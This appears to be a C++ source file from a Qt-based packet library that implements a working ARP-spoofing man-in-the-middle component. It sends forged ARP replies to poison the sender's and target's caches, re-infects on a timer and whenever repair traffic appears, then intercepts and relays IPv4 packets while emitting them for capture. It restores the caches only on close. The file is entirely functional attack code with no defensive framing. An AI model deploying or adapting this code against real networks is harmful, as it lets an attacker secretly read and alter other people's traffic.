#include "garpspoof.h"

// ----------------------------------------------------------------------------
// GArpSpoof
// ----------------------------------------------------------------------------
GArpSpoof::GArpSpoof(QObject* parent) : GPcapDevice(parent) {
	GDEBUG_CTOR;
}

GArpSpoof::~GArpSpoof() {
	GDEBUG_DTOR;

	close();
}

bool GArpSpoof::doOpen() {
	if (!GPcapDevice::doOpen()) return false;

	flowList_.clear();
	for (GAtm::iterator it = atm_.begin(); it != atm_.end();) {
		GMac mac = it.value();
		if (mac == GMac::nullMac())
			it = atm_.erase(it);
		else
			it++;
	}

	for (GObj* obj: propFlows_) {
		GArpSpoofFlow* propFlow = PArpSpoofFlow(obj);
		if (!propFlow->enabled_) continue;

		GIp senderIp = propFlow->senderIp_;
		GMac senderMac = propFlow->senderMac_;
		GIp targetIp = propFlow->targetIp_;
		GMac targetMac = propFlow->targetMac_;

		Q_ASSERT(intf_ != nullptr);
		if (senderIp == intf_->ip()) {
			QString msg = QString("sender(%1) can not be my ip").arg(QString(senderIp));
			SET_ERR(GErr::FAIL, msg);
			return false;
		}

		if (targetIp == intf_->ip()) {
			QString msg = QString("target(%1) can not be my ip").arg(QString(targetIp));
			SET_ERR(GErr::FAIL, msg);
			return false;
		}

		if (senderIp == targetIp) {
			QString msg = QString("sender(%1) and target(%2) can not be same").arg(QString(senderIp)).arg(QString(targetIp));
			SET_ERR(GErr::FAIL, msg);
			return false;
		}

		Flow flow(senderIp, senderMac, targetIp, targetMac);
		flowList_.push_back(flow);
		if (atm_.find(senderIp) == atm_.end())
			atm_.insert(flow.senderIp_, flow.senderMac_);
		if (atm_.find(targetIp) == atm_.end())
			atm_.insert(flow.targetIp_, flow.targetMac_);
	}

	GSyncPcapDevice device;
	device.devName_ = this->devName_;
	if (!device.open()) {
		err = device.err;
		return false;
	}
	bool res = atm_.waitAll(&device);
	if (!res) {
		QString msg = "can not find all host(s) ";
		for (GAtm::iterator it = atm_.begin(); it != atm_.end(); it++) {
			GMac mac = it.value();
			if (mac.isNull()) {
				GIp ip = it.key();
				msg += QString(ip) += " ";
			}
		}
		SET_ERR(GErr::FAIL, msg);
		return false;
	}
	device.close();

	flowMap_.clear();
	for(Flow& flow: flowList_) {
		if (flow.senderMac_.isNull())
			flow.senderMac_ = atm_.find(flow.senderIp_).value();
		if (flow.targetMac_.isNull())
			flow.targetMac_ = atm_.find(flow.targetIp_).value();
		GFlow::IpFlowKey ipFlowKey(flow.senderIp_, flow.targetIp_);
		FlowMap::iterator it = flowMap_.find(ipFlowKey);
		if (it == flowMap_.end())
			flowMap_.insert(ipFlowKey, flow);
		else
			*it = flow;
	}

	myMac_ = virtualMac_.isNull() ? intf_->mac() : virtualMac_;

	sendArpInfectAll();

	if (infectInterval_ != 0)
		infectThread_.start();

	return captureThreadOpen();
}

bool GArpSpoof::doClose() {
	qDebug() << ""; // gilgil temp 2019.08.16
	infectThread_.we_.wakeAll();
	infectThread_.wait();

	for (int i = 0; i < 3; i++) {
		sendARPReciverAll();
		QThread::msleep(100);
	}

	captureThreadClose();

	return GPcapDevice::doClose();
}

GPacket::Result GArpSpoof::relay(GPacket* packet) {
	return write(packet);
}

void GArpSpoof::run() {
	qDebug() << "GArpSpoof::run() beg"; // gilgil temp 2019.08.18

	GEthPacket packet;
	while (active()) {
		GPacket::Result res = read(&packet);
		if (res == GPacket::TimeOut) continue;
		if (res == GPacket::Eof || res == GPacket::Fail) break;

		GEthHdr* ethHdr = packet.ethHdr_;
		GArpHdr* arpHdr = packet.arpHdr_;
		GIpHdr* ipHdr = packet.ipHdr_;

		Q_ASSERT(ethHdr != nullptr);
		// attacker sending packet?
		if (ethHdr->smac() == myMac_) continue;

		switch (packet.ethHdr_->type()) {
			case GEthHdr::Arp: {
				Q_ASSERT(arpHdr != nullptr);
				for (Flow& flow: flowList_) {
					bool infect = false;
					if (arpHdr->sip() == flow.senderIp_ && arpHdr->tip() == flow.targetIp_) { // sender > target ARP packet
						qDebug() << QString("sender(%1) to target(%2) ARP packet").arg(QString(flow.senderIp_)).arg(QString(flow.targetIp_));
						infect = true;
					} else
					if (arpHdr->sip() == flow.targetIp_ && ethHdr->dmac() == GMac::broadcastMac()) { // target to any ARP packet
						qDebug() << QString("target(%1) to any(%2) ARP packet").arg(QString(flow.targetIp_)).arg(QString(flow.senderIp_));
						infect = true;
					}
					if (infect)
						sendArpInfect(&flow);
				}
				break;
			}

			case GEthHdr::Ip4: {
				Q_ASSERT(ipHdr != nullptr);
				GIp adjSrcIp = intf_->getAdjIp(ipHdr->sip());
				GIp adjDstIp = intf_->getAdjIp(ipHdr->dip());
				GFlow::IpFlowKey key(adjSrcIp, adjDstIp);
				FlowMap::iterator it = flowMap_.find(key);
				if (it == flowMap_.end()) break;
				Flow& flow = it.value();
				ethHdr->dmac_ = flow.targetMac_;
				emit captured(&packet);
				ethHdr->smac_ = myMac_;
				if (!packet.ctrl.block_) {
					res = relay(&packet);
					if (res != GPacket::Ok) {
						qWarning() << "relay return " << int(res);
					}
				}
				break;
			}

			default: break;
		}
	}
	qDebug() << "GArpSpoof::run() end"; // gilgil temp 2019.08.18
	emit closed();
}

void GArpSpoof::InfectThread::run() {
	while (true) {
		if (we_.wait(arpSpoof_->infectInterval_)) break;
		arpSpoof_->sendArpInfectAll();
	}
}

bool GArpSpoof::sendArpInfectAll() {
	for (Flow& session: flowList_) {
		if (!sendArpInfect(&session))
			return false;
	}
	return true;
}

bool GArpSpoof::sendArpInfect(Flow* flow) {
	return sendArp(flow, true);
}

bool GArpSpoof::sendARPReciverAll() {
	for (Flow& flow: flowList_) {
		if (!sendArpRecover(&flow))
			return false;
	}
	return true;
}

bool GArpSpoof::sendArpRecover(Flow* flow) {
	return sendArp(flow, false);
}

bool GArpSpoof::sendArp(Flow* flow, bool infect) {
	GEthArpHdr sendPacket;

	sendPacket.ethHdr_.dmac_ = flow->senderMac_;
	sendPacket.ethHdr_.smac_ = myMac_;
	sendPacket.ethHdr_.type_ = htons(GEthHdr::Arp);

	sendPacket.arpHdr_.hrd_ = htons(GArpHdr::ETHER);
	sendPacket.arpHdr_.pro_ = htons(GEthHdr::Ip4);
	sendPacket.arpHdr_.hln_ = sizeof(GMac);
	sendPacket.arpHdr_.pln_ = sizeof(GIp);
	sendPacket.arpHdr_.op_ = htons(GArpHdr::Reply);
	sendPacket.arpHdr_.smac_ = infect ? myMac_ : flow->targetMac_; // infect(true) or recover(false)
	sendPacket.arpHdr_.sip_ = htonl(flow->targetIp_);
	sendPacket.arpHdr_.tmac_ = flow->senderMac_;
	sendPacket.arpHdr_.tip_ = htonl(flow->senderIp_);

	GPacket::Result res = write(GBuf(pbyte(&sendPacket), sizeof(sendPacket)));
	return res == GPacket::Ok;
}
